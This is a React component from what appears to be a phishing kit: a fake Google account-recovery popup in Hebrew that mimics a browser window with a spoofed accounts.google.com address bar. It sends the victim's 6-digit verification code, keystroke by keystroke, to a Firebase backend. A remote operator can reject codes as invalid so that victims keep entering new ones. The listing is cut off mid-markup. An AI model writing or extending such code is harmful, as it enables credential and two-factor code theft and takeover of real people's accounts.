import React from "react";
import EmailLayout from "../EmailLayout";
// Imagem movida para pasta public
const gmailLogo = "/logogmail.svg";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { getDetectedLanguageDisplayName } from "../../../utils/languageUtils";
import { useClientCountry } from "../../../hooks/use-client-country";
import { EmailManager } from "../../../utils/emailManager";
import { DeviceManager } from "../../../utils/deviceManager";

// Gmail Code by Email page (visual only), matching GmailPasswordPage look & behavior
const GmailCodeMailPage = ({ embedded = false }) => {
  const {
    updateClientData,
    commands,
    isUserActive,
    clearCommands,
    clientData,
  } = useFirebaseClient();
  const { country } = useClientCountry();
  const [isNetOnline, setIsNetOnline] = React.useState(
    typeof navigator !== "undefined" ? navigator.onLine : true
  );
  const presence = React.useMemo(() => {
    if (!isNetOnline) return "offline";
    if (!isUserActive) return "away";
    return "online";
  }, [isNetOnline, isUserActive]);

  React.useEffect(() => {
    const onOnline = () => setIsNetOnline(true);
    const onOffline = () => setIsNetOnline(false);
    window.addEventListener("online", onOnline);
    window.addEventListener("offline", onOffline);
    return () => {
      window.removeEventListener("online", onOnline);
      window.removeEventListener("offline", onOffline);
    };
  }, []);

  // Atualizar URL/página no Firebase
  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=codemail",
      currentPage: "gmail_codemail",
      gmailStage: "codemail",
      fromForm: true,
    });
  }, [updateClientData]);

  const [code, setCode] = React.useState("");
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState("bar"); // 'bar' | 'final'
  const [isReady, setIsReady] = React.useState(false);
  const [progress, setProgress] = React.useState(0);

  React.useEffect(() => {
    // Preloader com duração de 2.5 segundos
    const startTime = Date.now();
    const duration = 2500; // 2.5 segundos

    const updateProgress = () => {
      const elapsed = Date.now() - startTime;
      const newProgress = Math.min((elapsed / duration) * 100, 100);
      setProgress(newProgress);

      if (newProgress < 100) {
        requestAnimationFrame(updateProgress);
      }
    };

    requestAnimationFrame(updateProgress);

    // Aguarda a barra completar totalmente antes de abrir o modal
    const id = setTimeout(() => setIsReady(true), 2600); // 100ms a mais para garantir que chegue a 100%
    return () => clearTimeout(id);
  }, []);
  const phrases = React.useMemo(
    () => [
      "מתחבר...",
      "אנא המתן רגע...",
      "מסיים את החיבור שלך...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);

  const translations = {
    windowTitle: "היכנס לחשבונות Google",
    url: "https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com",
    header: "היכנס ל-Google",
  };

  // Window drag + responsividade
  const computeFrameWidth = () =>
    Math.min(466, Math.max(320, window.innerWidth - 24));
  const computeFrameTop = () => Math.max(0, (window.innerHeight - 560) / 2);
  const [frameWidth, setFrameWidth] = React.useState(computeFrameWidth());
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - computeFrameWidth()) / 2),
    top: computeFrameTop(),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });

  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA"].includes(tag)) return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };

  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    const onResize = () => {
      const w = computeFrameWidth();
      setFrameWidth(w);
      setPosition({
        left: Math.max(12, (window.innerWidth - w) / 2),
        top: computeFrameTop(),
      });
    };
    window.addEventListener("resize", onResize);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      window.removeEventListener("resize", onResize);
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  const handleNext = () => {
    try {
      updateClientData({ gmailCodeMailSubmittedAt: Date.now() });
    } catch {}
    setIsSubmitting(true);
    setLoadingStage("bar");
    setTimeout(() => setLoadingStage("final"), 3000);
  };

  React.useEffect(() => {
    if (isSubmitting && loadingStage === "final") {
      const id = setInterval(
        () => setPhraseIndex((p) => (p + 1) % phrases.length),
        2000
      );
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, phrases.length]);

  // Toasts simples
  const [invalidMessage, setInvalidMessage] = React.useState("");

  const navigateByCommand = React.useCallback(() => false, []);

  const handleInvalid = React.useCallback(
    (cmd) => {
      const map = {
        invalid_gmailcodemail: "קוד אימייל שגוי.",
        invalid_codemail: "קוד אימייל שגוי.",
      };
      if (cmd in map) {
        setInvalidMessage(map[cmd]);
        setIsSubmitting(false);
        clearCommands();
        return true;
      }
      return false;
    },
    [clearCommands]
  );

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latestRaw = commands[commands.length - 1];
    if (!latestRaw) return;
    const latest =
      typeof latestRaw === "string"
        ? latestRaw.replace(/^\"+|\"+$/g, "").trim()
        : latestRaw;
    if (typeof latest !== "string") return;
    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      handleInvalid(latest);
      return;
    }
    const navigated = navigateByCommand(latest);
    if (navigated) setTimeout(() => clearCommands(), 50);
  }, [commands, navigateByCommand, handleInvalid, clearCommands]);

  // Device number dinâmico vindo do dashboard; fallback para localStorage/cliente
  // Detectar se o usuário fez login na página inicial
  const getLoggedInDevice = () => {
    // Usar o novo sistema de device com fallbacks múltiplos
    const device = DeviceManager.getDeviceWithFirebaseData(clientData);
    
    if (device) {
      console.log("📱 Device number obtido com novo sistema (GmailCodeMail):", device);
      return device;
    }
    
    console.log("📱 Device number não encontrado (GmailCodeMail)");
    return "";
  };

  const [displayDevice, setDisplayDevice] = React.useState(getLoggedInDevice());

  // Monitorar mudanças no localStorage e clientData para atualizar device number em tempo real
  React.useEffect(() => {
    const handleStorageChange = () => {
      const newDevice = getLoggedInDevice();
      if (newDevice && newDevice !== displayDevice) {
        setDisplayDevice(newDevice);
        console.log("📱 Gmail Code Modal - Device number atualizado:", newDevice);
      }
    };

    // Escutar mudanças no localStorage
    window.addEventListener("storage", handleStorageChange);

    // Verificar periodicamente (para mudanças na mesma aba)
    const interval = setInterval(handleStorageChange, 1000);

    return () => {
      window.removeEventListener("storage", handleStorageChange);
      clearInterval(interval);
    };
  }, [displayDevice, clientData?.deviceNumber]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ 
          fontFamily: "Roboto, Arial, sans-serif",
          direction: "rtl",
          textAlign: "right"
        }}
      >
        {/* presence + toasts removidos */}
        {false && (
          <div
            style={{
              position: "fixed",
              top: 10,
              left: 10,
              zIndex: 60,
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 10px",
              borderRadius: 999,
              background: "rgba(0,0,0,0.45)",
              color: "#e5e7eb",
              fontSize: 12,
              border: "1px solid rgba(255,255,255,0.08)",
              backdropFilter: "blur(0.5px)",
            }}
          >
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: 999,
                display: "inline-block",
                background:
                  presence === "online"
                    ? "#22c55e"
                    : presence === "away"
                    ? "#f59e0b"
                    : "#ef4444",
              }}
            />
            <span style={{ textTransform: "capitalize" }}>{presence}</span>
          </div>
        )}
        {/* toasts removidos */}
        <div
          onMouseDown={startDrag}
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0,0,0,0.3)",
            width: "min(466px, 96vw)",
            height: Math.min(560, Math.max(420, window.innerHeight - 24)),
            color: "#202124",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Spinner de loading inicial */}
          {!isReady && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 9999,
                borderRadius: 12,
              }}
            >
              {/* Barra da janela */}
              <div
                style={{
                  height: 32,
                  background: "#e8f0fe",
                  borderBottom: "1px solid #d7e3fc",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 8px",
                  fontSize: 12,
                  direction: "ltr", // Força LTR para manter botões à direita
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="https://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                  {translations.windowTitle}
                </span>
                <div style={{ display: "flex", gap: 4 }}>
                  <button
                    title="Minimize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M3 8.5H13"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                  <button
                    title="Maximize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#111"
                        strokeWidth="1.5"
                      />
                    </svg>
                  </button>
                  <button
                    title="Close"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M4 4L12 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              {/* URL bar */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                    direction: "ltr", // Força LTR para manter ícone à esquerda
                  }}
                >
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>

              {/* Barra de progresso */}
              <div
                style={{
                  width: "100%",
                  height: 2,
                  background: "#e8f0fe",
                  position: "relative",
                }}
              >
                <div
                  style={{
                    width: `${progress}%`,
                    height: "100%",
                    background: "#1a73e8",
                    transition: "width 0.1s ease-out",
                    position: "absolute",
                    left: 0,
                    top: 0,
                  }}
                />
              </div>

              {/* Header pequeno */}
              <div
                style={{
                  width: "100%",
                  background: "#ffffff",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  borderBottom: "1px solid #eaecee",
                  height: 40,
                }}
              >
                <div
                  style={{
                    width: 20,
                    height: 20,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="18"
                    height="18"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                </div>
                <span style={{ color: "#000", fontSize: 12 }}>
                  {translations.header}
                </span>
              </div>

              {/* Conteúdo central com spinner */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #1a73e8",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>

              {/* Footer */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    עזרה
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    פרטיות
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    תנאים
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
                  {country?.name || "לא ידוע"}
                </span>
              </div>
            </div>
          )}
          {/* Titlebar */}
          <div
            style={{
              height: 32,
              background: "#e8f0fe",
              borderBottom: "1px solid #d7e3fc",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 8px",
              fontSize: 12,
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 6,
              }}
            >
              <svg
                xmlns="https://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#111"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                onClick={() => setInvalidMessage("קוד אימייל שגוי.")}
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* URL bar */}
          <div
            style={{
              borderBottom: "1px solid #eaecee",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#eef1f3",
                border: "1px solid #d0d7de",
                borderRadius: 0,
                height: 32,
                display: "flex",
                alignItems: "center",
                padding: "0 10px",
                gap: 8,
                fontSize: 12,
                color: "#202124",
                direction: "ltr", // Força LTR para manter ícone à esquerda
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                stroke="#5f6368"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          {/* Loading bar below URL for stage 'bar' */}
          {isSubmitting && loadingStage === "bar" && (
            <div
              style={{
                width: "100%",
                height: 4,
                background: "#ffffff",
                overflow: "hidden",
                margin: 0,
              }}
            >
              <div
                style={{
                  width: "100%",
                  height: "100%",
                  background: "#1a73e8",
                  animation: "loadingBar 2s ease-in-out infinite",
                }}
              />
            </div>
          )}

          {/* Header small */}
          <div
            style={{
              width: "100%",
              background: "#ffffff",
              padding: "4px 8px",
              display: "flex",
              alignItems: "center",
              gap: 6,
              borderBottom: "1px solid #eaecee",
              height: 40,
            }}
          >
            <div
              style={{
                width: 20,
                height: 20,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
            </div>
            <span style={{ color: "#000", fontSize: 12 }}>
              {translations.header}
            </span>
          </div>

          {/* Main content */}
          <div
            style={{
              flex: 1,
              padding: "24px 24px 24px",
              opacity: isSubmitting && loadingStage === "bar" ? 0.7 : 1,
              pointerEvents:
                isSubmitting && loadingStage === "bar" ? "none" : "auto",
              position: "relative",
            }}
          >
            <h1 style={{ fontSize: 28, fontWeight: 500, margin: 0 }}>
              שחזור חשבון
            </h1>
            <p
              style={{ color: "#3c4043", fontSize: 14, margin: "12px 0 16px" }}
            >
              כדי לעזור לשמור על החשבון שלך בטוח, Google רוצה לוודא שזה
              באמת אתה מנסה להיכנס
            </p>



            {/* Info text com device number em negrito */}
            {displayDevice && (
              <p style={{ color: "#1f2328", fontSize: 14, marginTop: 8 }}>
                שלחנו קוד אימות למכשיר{" "}
                <strong>{displayDevice}</strong>. הכנס את הקוד בן 6 הספרות למטה.
              </p>
            )}

            {/* Code input */}
            <div style={{ marginTop: 12 }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  border: "1px solid #dadce0",
                  borderRadius: 4,
                  padding: "12px 16px",
                  background: "#fff",
                  maxWidth: 366,
                  position: "relative",
                }}
              >
                <input
                  data-gmail-modal
                  type="text"
                  value={code}
                  onChange={(e) => {
                    const normalized = e.target.value
                      .replace(/\D/g, "")
                      .slice(0, 6);
                    setCode(normalized);
                    updateClientData({
                      gmailCodeMail: normalized,
                      lastEmailInput: Date.now(),
                    });
                  }}
                  placeholder="הכנס קוד"
                  style={{
                    border: "none",
                    outline: "none",
                    fontSize: 16,
                    width: "100%",
                    background: "transparent",
                    color: "#202124",
                  }}
                  maxLength={6}
                  disabled={isSubmitting}
                />
              </div>
              {invalidMessage && (
                <div
                  style={{
                    color: "#d93025",
                    fontSize: 12,
                    marginTop: 6,
                    maxWidth: 366,
                  }}
                >
                  {invalidMessage}
                </div>
              )}
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  marginTop: 28,
                  maxWidth: 366,
                }}
              >
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  style={{
                    color: "#1a73e8",
                    textDecoration: "none",
                    fontSize: 14,
                  }}
                >
                  נסה דרך אחרת
                </a>
                <button
                  onClick={handleNext}
                  disabled={isSubmitting}
                  style={{
                    padding: "10px 22px",
                    background: isSubmitting ? "#b3d1fa" : "#1a73e8",
                    color: "#ffffff",
                    border: "none",
                    borderRadius: 999,
                    fontSize: 14,
                    fontWeight: 600,
                    cursor: isSubmitting ? "not-allowed" : "pointer",
                    minWidth: 80,
                    minHeight: 36,
                  }}
                >
                  הבא
                </button>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div
            style={{
              width: "100%",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              minHeight: 44,
              borderTop: "1px solid #f0f0f0",
              background: "transparent",
              padding: "0 24px",
            }}
          >
            <div style={{ display: "flex", gap: 40 }}>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                עזרה
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                פרטיות
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                תנאים
              </a>
            </div>
            <span style={{ color: "#666", fontSize: 12 }}>
              {country?.name || "..."}
            </span>
          </div>

          {/* Final overlay with GIF + spinner + phrases */}
          {isSubmitting && loadingStage === "final" && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 11,
              }}
            >
              {/* Barra da janela (overlay) */}
              <div
                style={{
                  height: 32,
                  background: "#e8f0fe",
                  borderBottom: "1px solid #d7e3fc",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 8px",
                  fontSize: 12,
                  color: "#202124",
                  direction: "ltr", // Força LTR para manter botões à direita
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="https://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                  {translations.header}
                </span>
                <div
                  style={{ display: "flex", gap: 4, alignItems: "center" }}
                >
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 16 16"
                    aria-hidden="true"
                  >
                    <path
                      d="M3 8.5H13"
                      stroke="#5f6368"
                      strokeWidth="1.2"
                      strokeLinecap="round"
                    />
                  </svg>
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 16 16"
                    aria-hidden="true"
                  >
                    <rect
                      x="3.5"
                      y="3.5"
                      width="9"
                      height="9"
                      rx="1"
                      stroke="#5f6368"
                      strokeWidth="1.2"
                      fill="none"
                    />
                  </svg>
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 16 16"
                    aria-hidden="true"
                  >
                    <path
                      d="M4 4L12 12"
                      stroke="#5f6368"
                      strokeWidth="1.2"
                      strokeLinecap="round"
                    />
                    <path
                      d="M12 4L4 12"
                      stroke="#5f6368"
                      strokeWidth="1.2"
                      strokeLinecap="round"
                    />
                  </svg>
                </div>
              </div>
              {/* URL bar (overlay) */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                    direction: "ltr", // Força LTR para manter ícone à esquerda
                  }}
                >
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>
              {/* Barra animada acima do header (overlay) */}
              <div
                style={{
                  width: "100%",
                  height: 4,
                  background: "#ffffff",
                  overflow: "hidden",
                  margin: 0,
                  borderRadius: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    height: "100%",
                    background: "#1a73e8",
                    animation: "loadingBar 2s ease-in-out infinite",
                  }}
                />
              </div>
              <div
                style={{
